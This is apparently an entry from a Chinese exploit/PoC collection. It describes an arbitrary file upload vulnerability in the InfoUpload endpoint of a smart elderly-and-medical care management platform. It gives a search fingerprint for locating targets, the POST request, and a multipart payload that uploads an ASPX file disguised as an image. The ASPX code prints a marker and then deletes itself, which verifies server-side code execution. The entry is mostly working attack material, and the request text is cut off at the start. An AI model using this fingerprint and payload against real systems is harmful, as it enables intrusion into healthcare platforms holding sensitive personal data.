# 智慧医养综合服务管理平台InfoUpload存在任意文件上传漏洞

智慧医养综合服务管理平台 ｜ 文件上传 ｜ —
- **指纹**：`body="Content/css/Login/images/gtx-main-bg00004.png"`
- **请求**：`POST /WebData/InfoUpload HTTP/1.1`

**Payload**
```
like Gecko) Chrome/91.0.4472.77 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
------WebKitFormBoundaryFfJZ4PlAZBixjELj
Content-Disposition: form-data; name="file"; filename="test123.aspx"
Content-Type: image/png
<%@ Page Language="C#"%><% Response.Write("test123"); System.IO.File.Delete(Server.MapPath(Request.Url.AbsolutePath)); %>
------WebKitFormBoundaryFfJZ4PlAZBixjELj--
```
- **响应特征**：200 aspx